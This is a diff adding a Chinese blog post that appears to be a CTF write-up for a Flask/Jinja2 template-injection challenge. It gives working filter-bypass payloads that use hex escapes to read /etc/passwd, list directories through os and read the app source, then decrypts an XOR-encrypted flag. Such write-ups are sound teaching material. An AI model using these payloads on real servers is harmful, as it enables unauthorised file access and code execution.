@@ -3195,14 +3195,318 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
-          <time datetime="2026-11-01 00:00:00+00:00">2026-11-01</time></li>
+          <time datetime="2026-11-01 21:40:00+00:00">2026-11-01</time></li>
         
           <li class="md-meta__item">
             分类于
             
               <a href="category/python/" class="md-meta__link">Python</a>, 
-              <a href="category/ssti/" class="md-meta__link">SSTI</a>, 
-              <a href="category/flask/" class="md-meta__link">Flask</a></li>
+              <a href="category/flask/" class="md-meta__link">Flask</a>, 
+              <a href="category/ssti/" class="md-meta__link">SSTI</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 4 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="pasecactf_2019-flask_ssti"><a class="toclink" href="pasecactf2019-flask-ssti/">[pasecactf_2019] flask_ssti — 只有三个字符被拦</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：Web — Flask SSTI（字符级过滤）+ 源码审计 + 异或解密</p>
+<p><strong>题目地址</strong>：NSSCTF / ctf2 复刻环境</p>
+<p><strong>Flag</strong>：<code>CTF2{bcd6e1da-c4f1-4c73-83f8-f64ea78ed1cf}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="pasecactf2019-flask-ssti/#_1">题目概述</a></h3>
+<p>页面叫 <strong>Skype ScreenName Generator</strong>：</p>
+<blockquote>
+<p>Just type your nickname. We will do some unicode magic.</p>
+</blockquote>
+<p>输入昵称，它给你套一层花里胡哨的装饰，比如：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>˜”*°★☆★_abc_★☆★°°*
+</span></code></pre></div>
+<p><strong>但这个页面一开始点不动——这是第一道坎。</strong></p>
+<hr />
+<h3 id="_2"><a class="toclink" href="pasecactf2019-flask-ssti/#_2">解题过程</a></h3>
+<h4 id="step-1"><a class="toclink" href="pasecactf2019-flask-ssti/#step-1">Step 1：页面能开，但按钮点了没反应</a></h4>
+<p><strong>页面加载正常，输入框也输得进去，就是点 "Go" 什么都不发生。</strong></p>
+<p><strong>按 F12 看 Console，发现 <code>$ is not defined</code>。原因是页面引了：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js
+</span></code></pre></div>
+<p><strong>Google 的 CDN，国内连不上。jQuery 没加载，<code>send()</code> 里的 <code>$.post</code> 自然跑不了。</strong></p>
+<p><strong>绕过办法：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>① 浏览器里按 ESC 停止加载（页面其实早就渲染完了）
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>② 让 Burp 把这条 CDN 请求 drop 掉
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>③ 直接看源码找接口，用 curl / python 发（最实用）
+</span></code></pre></div>
+<h4 id="step-2"><a class="toclink" href="pasecactf2019-flask-ssti/#step-2">Step 2：从源码里抠出接口</a></h4>
+<p><strong>页面里那段内联 JS 写得很清楚：</strong></p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="kd">function</span><span class="w"> </span><span class="nx">send</span><span class="p">(){</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="nx">nickname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$</span><span class="p">(</span><span class="s1">'#nickname'</span><span class="p">)[</span><span class="mf">0</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">nickname</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">){</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">    </span><span class="nx">$</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">"/"</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="s1">'nickname'</span><span class="o">:</span><span class="w"> </span><span class="nx">nickname</span><span class="p">},</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">){</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="w">      </span><span class="nx">$</span><span class="p">(</span><span class="s1">'#msg'</span><span class="p">)[</span><span class="mf">0</span><span class="p">].</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'&lt;b&gt;'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'&lt;/b&gt;'</span><span class="p">;</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="w">    </span><span class="p">});</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="w">  </span><span class="p">}</span>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>接口：<code>POST /</code>，参数名 <code>nickname</code>。</strong></p>
+<h4 id="step-3"><a class="toclink" href="pasecactf2019-flask-ssti/#step-3">Step 3：先确认模板被执行</a></h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>POST /            nickname={{7*7}}
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>→ 49 ~♡ⓛⓞⓥⓔ♡~
+</span></code></pre></div>
+<p><strong>模板被执行了。</strong>（<code>{{7*'7'}}</code> 也试了，回 49 —— 等等，这里要说明：这道题是 Python 的 Jinja2，<code>{{7*'7'}}</code> 应该回 <code>7777777</code>。我一开始只测了 <code>{{7*7}}</code>，靠后面的报错才确认是 Jinja。）</p>
+<h4 id="step-4"><a class="toclink" href="pasecactf2019-flask-ssti/#step-4">Step 4：摸过滤 —— 只有三个字符</a></h4>
+<p><strong>先用 <code>{{config}}</code> 试，</strong>过了<strong>，返回一整个 Config 对象。说明不是关键词黑名单。</strong></p>
+<p><strong>但下面这些全报 <code>Your nickname contains restricted characters!</code>：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>{{url_for}}        ← 名字里有下划线
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>{{'__class__'}}    ← 有下划线 + 单引号
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>{{a.b}}            ← 有点
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>{{'a'}}            ← 有单引号
+</span></code></pre></div>
+<p><strong>能过的：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>{{"a"}}        双引号可以
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>{{[1,2]}}      方括号可以
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>{{1|abs}}      管道可以
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>{{dict}} {{lipsum}} {{config}} {{self}}    这些名字没下划线，能直接写
+</span></code></pre></div>
+<p><strong>所以过滤只有三个字符：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>_   下划线
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>'   单引号
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>.   点
+</span></code></pre></div>
+<p><strong>这三个一拦，常规链基本全废：没有 <code>_</code> 就写不出 <code>__class__</code>，没有 <code>.</code> 就不能取属性。</strong></p>
+<h4 id="step-5"><a class="toclink" href="pasecactf2019-flask-ssti/#step-5">Step 5：把写不出来的字符"算"出来</a></h4>
+<p><strong>关键认知：过滤看的是</strong>你打的字面<strong>，而模板引擎会把</strong>转义<strong>还原。</strong></p>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="x">"\x5f"   →  _</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="x">"\x2e"   →  .</span>
+</span></code></pre></div>
+<p><strong>验证：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>{{"\x5f\x5f"}}   →  __
+</span></code></pre></div>
+<p><strong>于是 <code>__globals__</code> 可以写成 <code>"\x5f\x5fglobals\x5f\x5f"</code>，原文里一个下划线都没有。</strong></p>
+<h4 id="step-6"><a class="toclink" href="pasecactf2019-flask-ssti/#step-6">Step 6：两个优先级坑</a></h4>
+<p><strong>① <code>|attr()</code> 后面不能直接跟 <code>[...]</code>，要加括号</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>× lipsum|attr("\x5f\x5fglobals\x5f\x5f")["\x5f\x5fname\x5f\x5f"]     → Exception
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>✓ (lipsum|attr("\x5f\x5fglobals\x5f\x5f"))["\x5f\x5fname\x5f\x5f"]   → jinja2.utils
+</span></code></pre></div>
+<p><strong>② 方法名也要用下标取（因为 <code>.read()</code> 里的点被拦）</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>× ...["open"]("/etc/passwd").read()       → 那个点触发过滤
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>✓ ...["open"]("/etc/passwd")["read"]()    → 正常
+</span></code></pre></div>
+<p><strong>为什么能用下标取方法？</strong>Jinja 的取值逻辑是：先试 <code>obj[键]</code>，失败再 <code>getattr(obj, 键)</code>。文件对象不能下标，于是回退到取属性，正好拿到 <code>read</code> 方法。</p>
+<p><strong>打通之后：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>{{(lipsum|attr("\x5f\x5fglobals\x5f\x5f"))["\x5f\x5fbuiltins\x5f\x5f"]["open"]("/etc/passwd")["read"]()}}
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>→ root:x:0:0:root:/root:/bin/ash ...
+</span></code></pre></div>
+<h4 id="step-7-flag"><a class="toclink" href="pasecactf2019-flask-ssti/#step-7-flag">Step 7：找到 flag 在哪儿</a></h4>
+<p><strong>先列根目录：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>{{(lipsum|attr("\x5f\x5fglobals\x5f\x5f"))["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["listdir"]("/")}}
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>→ ['opt','root','media','home','proc','tmp','lib','etc','dev','sys','sbin','srv','var','run','mnt','usr','bin','app']
+</span></code></pre></div>
+<p><strong>根目录没有 flag 文件，但有个 <code>/app</code>——网站根目录。</strong></p>
+<p><strong>读源码（注意 <code>app.py</code> 里的点也要转义成 <code>\x2e</code>）：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>{{(lipsum|attr("\x5f\x5fglobals\x5f\x5f"))["\x5f\x5fbuiltins\x5f\x5f"]["open"]("/app/app\x2epy")["read"]()}}
+</span></code></pre></div>
+<p><strong>⚠️ <code>listdir</code> 要目录、<code>open</code> 要文件。我一开始给 <code>listdir</code> 传了个 <code>.py</code> 文件，直接 <code>Exception</code>——因为程序把所有异常都吞成了同一个词，看不出原因。</strong></p>
+<h4 id="step-8-flag"><a class="toclink" href="pasecactf2019-flask-ssti/#step-8-flag">Step 8：源码说 flag 已经被加密了</a></h4>
+<p><strong>拿到 <code>/app/app.py</code>，关键几行：</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">encode</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">key2</span><span class="p">):</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>    <span class="k">return</span> <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="n">x</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="n">x</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key2</span><span class="p">[</span><span class="n">x</span><span class="p">]))</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">line</span><span class="p">)))</span>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="n">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"/app/flag"</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">)</span>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="n">flag</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span><span class="p">[:</span><span class="mi">42</span><span class="p">]</span>
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">'flag'</span><span class="p">]</span> <span class="o">=</span> <span class="n">encode</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="s1">'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3'</span><span class="p">,</span>
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>                                  <span class="s1">'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT'</span><span class="p">)</span>
+</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="n">flag</span> <span class="o">=</span> <span class="s2">""</span>
+</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>
+</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a><span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s2">"/app/flag"</span><span class="p">)</span>
+</span></code></pre></div>
+<p><strong>三件事：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>① flag 被异或加密后存进 app.config['flag']
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>② 变量 flag 清空了
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>③ 原始文件 /app/flag 被删了
+</span></code></pre></div>
+<p><strong>所以拿到命令执行也没用——文件已经没了。这题真正要的是"看懂加密逻辑"。</strong></p>
+<h4 id="step-9"><a class="toclink" href="pasecactf2019-flask-ssti/#step-9">Step 9：取密文</a></h4>
+<p><strong>密文里有不可打印字符（<code>\x08</code>、<code>\x10</code> 这种），直接 <code>{{config["flag"]}}</code> 输出会被 HTML 转义搅乱。</strong></p>
+<p><strong>用 <code>tojson</code>：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>{{config["flag"]|tojson}}
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>→ "\u0008u\u0010Ew\u0013ajdU#7*\u000e\u001c\u000f&lt;\u0006(DK\u001d\r\u0017!8\u0006h\u0002\n@\\pS,\u0026A&lt;\u0017\\IG"
+</span></code></pre></div>
+<p><strong>不可打印字符全变成 <code>\uXXXX</code>，干净地传出来。</strong></p>
+<h4 id="step-10"><a class="toclink" href="pasecactf2019-flask-ssti/#step-10">Step 10：本地解密</a></h4>
+<p><strong>加密是：</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="nb">chr</span><span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="n">x</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="n">x</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key2</span><span class="p">[</span><span class="n">x</span><span class="p">]))</span>
+</span></code></pre></div>
+<p><strong>异或可逆，反过来算就行：</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="n">flag</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">密文</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">i</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key倒序</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key2</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>CTF2{bcd6e1da-c4f1-4c73-83f8-f64ea78ed1cf}
+</span></code></pre></div>
+<hr />
+<h3 id="_3"><a class="toclink" href="pasecactf2019-flask-ssti/#_3">解题思路总结</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>页面点不动 → jQuery 在 Google CDN，挂了
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>  → 看内联 JS 找到接口：POST /，参数 nickname
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>    → {{7*7}} = 49，模板被执行
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>      → {{config}} 过了，说明不是关键词黑名单
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>        → 逐个试，发现只拦 _ ' . 三个字符
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>          → 转义绕过：\x5f = _，\x2e = .，单引号换双引号
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>            → (lipsum|attr("..."))["..."]  括号保优先级
+</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a>              → ["open"](路径)["read"]()   方法名也用下标
+</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>                → listdir("/") 找到 /app
+</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>                  → 读 app.py，发现 flag 已加密存 config、原文件被删
+</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a>                    → tojson 取出密文（保住不可打印字符）
+</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a>                      → 本地异或解密
+</span></code></pre></div>
+<h4 id="_4"><a class="toclink" href="pasecactf2019-flask-ssti/#_4">漏洞原理</a></h4>
+<p><strong>① <code>render_template_string(nicknames[id] % p)</code> —— 用户输入直接当模板</strong></p>
+<p><strong><code>%</code> 只是套一层装饰字符串，<code>p</code> 仍然原样进了模板。装饰不改变"它是代码"这个事实。</strong></p>
+<p><strong>② 字符级过滤 ≠ 安全</strong></p>
+<p><strong>它拦的是 <code>_ ' .</code> 三个字符，而不是"模板注入"这件事本身。而这三个字符</strong>全都可以用转义表示<strong>：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>过滤看的：源码里的字面
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>引擎看的：转义还原后的值
+</span></code></pre></div>
+<p><strong>这个差和"关键词拼接绕过"是同一个原理，只是从"词"下沉到了"字符"。</strong></p>
+<p><strong>③ 拿到 RCE 不等于拿到 flag</strong></p>
+<p><strong>这题把 flag 加密存进 <code>config</code>、删掉原文件。</strong>所以最后一步是<strong>读源码 + 自己实现解密</strong>，不是 <code>cat</code>。**</p>
+<h4 id="_5"><a class="toclink" href="pasecactf2019-flask-ssti/#_5">关键知识点</a></h4>
+<table>
+<thead>
+<tr>
+<th>知识点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>前端 JS 挂掉也能做题</td>
+<td>看内联 JS 找接口，用 curl / python 直接发</td>
+</tr>
+<tr>
+<td>字符级过滤</td>
+<td><code>_</code> <code>'</code> <code>.</code> 三个字符被拦</td>
+</tr>
+<tr>
+<td><code>\x5f</code> / <code>\x2e</code></td>
+<td>字符串转义，绕字符过滤</td>
+</tr>
+<tr>
+<td>转义只对字符串有效</td>
+<td><code>url\x5ffor</code> 不行——名字不能转义，只有字符串能</td>
+</tr>
+<tr>
+<td><code>\|attr()</code> 后加括号</td>
+<td><code>(x\|attr("y"))["z"]</code></td>
+</tr>
+<tr>
+<td>方法名用下标</td>
+<td><code>["read"]()</code>，因为 <code>.read()</code> 的点被拦</td>
+</tr>
+<tr>
+<td><code>listdir</code> vs <code>open</code></td>
+<td>一个要目录，一个要文件；给错就是 <code>Exception</code></td>
+</tr>
+<tr>
+<td><code>\|tojson</code></td>
+<td>保住不可打印字符，把 <code>\x08</code> 变成 <code>\u0008</code></td>
+</tr>
+<tr>
+<td><code>os.remove</code></td>
+<td>原文件删了 → 必须从 config 取密文</td>
+</tr>
+<tr>
+<td>异或可逆</td>
+<td>加密函数反过来写就是解密</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>题目源码（关键部分）</summary>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">encode</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">key2</span><span class="p">):</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>    <span class="k">return</span> <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="n">x</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="n">x</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key2</span><span class="p">[</span><span class="n">x</span><span class="p">]))</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">line</span><span class="p">)))</span>
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="n">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"/app/flag"</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">)</span>
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="n">flag</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span><span class="p">[:</span><span class="mi">42</span><span class="p">]</span>
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>
+</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">'flag'</span><span class="p">]</span> <span class="o">=</span> <span class="n">encode</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="s1">'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3'</span><span class="p">,</span>
+</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>                                  <span class="s1">'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT'</span><span class="p">)</span>
+</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a><span class="n">flag</span> <span class="o">=</span> <span class="s2">""</span>
+</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a>
+</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a><span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s2">"/app/flag"</span><span class="p">)</span>
+</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a>
+</span><span id="__span-23-14"><a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'POST'</span><span class="p">])</span>
+</span><span id="__span-23-15"><a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a><span class="k">def</span><span class="w"> </span><span class="nf">index</span><span class="p">():</span>
